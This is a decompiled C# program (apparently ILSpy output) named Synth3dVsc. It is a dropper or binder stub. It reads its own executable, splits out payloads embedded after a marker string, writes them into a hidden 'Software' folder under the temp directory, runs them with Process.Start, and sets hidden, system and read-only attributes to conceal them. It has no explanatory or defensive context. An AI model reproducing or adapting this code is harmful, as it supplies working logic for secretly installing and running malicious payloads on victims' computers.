using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Synth3dVsc;

public class Class1
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void main()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string[] array = default(string[]);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 559:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_003c;
						case 5:
							goto IL_004f;
						case 6:
							goto IL_006c;
						case 7:
							goto IL_007c;
						case 8:
							goto IL_0091;
						case 9:
							goto IL_00a5;
						case 10:
							goto IL_00b7;
						case 11:
							goto IL_00cf;
						case 12:
							goto IL_00e6;
						case 13:
							goto IL_00fb;
						case 14:
							goto IL_010e;
						case 16:
							goto IL_0122;
						case 17:
							goto IL_0126;
						case 18:
							goto IL_013e;
						case 19:
							goto IL_0155;
						case 20:
							goto IL_016a;
						case 15:
						case 21:
						case 22:
							goto IL_017d;
						case 23:
							goto IL_0194;
						case 24:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 25:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0194:
					num = 23;
					File.SetAttributes(text + array[4], FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
					break;
					IL_0008:
					num = 2;
					Directory.CreateDirectory(Path.GetTempPath() + "\\Software");
					goto IL_0020;
					IL_0020:
					num = 3;
					File.SetAttributes(Path.GetTempPath() + "\\Software", FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
					goto IL_003c;
					IL_003c:
					num = 4;
					text = Path.GetTempPath() + "\\Software";
					goto IL_004f;
					IL_004f:
					num = 5;
					FileSystem.FileOpen(1, Process.GetCurrentProcess().MainModule!.FileName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_006c;
					IL_006c:
					num = 6;
					text2 = Strings.Space((int)FileSystem.LOF(1));
					goto IL_007c;
					IL_007c:
					num = 7;
					FileSystem.FileGet(1, ref text2, -1L, false);
					goto IL_0091;
					IL_0091:
					num = 8;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_00a5;
					IL_00a5:
					num = 9;
					array = Strings.Split(text2, "uu7oAFKCklgU2b", -1, (CompareMethod)0);
					goto IL_00b7;
					IL_00b7:
					num = 10;
					FileSystem.FileOpen(3, text + array[3], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_00cf;
					IL_00cf:
					num = 11;
					FileSystem.FilePut(3, array[1], -1L, false);
					goto IL_00e6;
					IL_00e6:
					num = 12;
					FileSystem.FileClose(new int[1] { 3 });
					goto IL_00fb;
					IL_00fb:
					num = 13;
					Process.Start(text + array[3]);
					goto IL_010e;
					IL_010e:
					num = 14;
					if (!File.Exists(text + array[4]))
					{
						goto IL_0122;
					}
					goto IL_017d;
					IL_0122:
					num = 16;
					goto IL_0126;
					IL_0126:
					num = 17;
					FileSystem.FileOpen(5, text + array[4], (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
					goto IL_013e;
					IL_013e:
					num = 18;
					FileSystem.FilePut(5, array[2], -1L, false);
					goto IL_0155;
					IL_0155:
					num = 19;
					FileSystem.FileClose(new int[1] { 5 });
					goto IL_016a;
					IL_016a:
					num = 20;
					Process.Start(text + array[4]);
					goto IL_017d;
					IL_017d:
					num = 22;
					File.SetAttributes(text + array[3], FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
					goto IL_0194;
					end_IL_0000_2:
					break;
				}
				num = 24;
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 559;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
